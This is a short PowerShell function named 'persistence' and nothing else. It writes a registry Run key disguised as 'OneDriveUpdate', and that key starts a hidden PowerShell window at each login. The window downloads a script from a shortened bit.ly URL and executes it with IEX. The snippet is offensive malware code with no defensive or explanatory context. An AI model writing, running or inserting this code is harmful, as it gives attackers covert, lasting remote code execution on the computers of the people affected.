function persistence{
  reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "OneDriveUpdate" /d "powershell.exe -NoP -W Hidden IEX (New-Object System.Net.Webclient).DownloadString('https://bit.ly/3uQ5Wid')" /t REG_SZ /f 
}
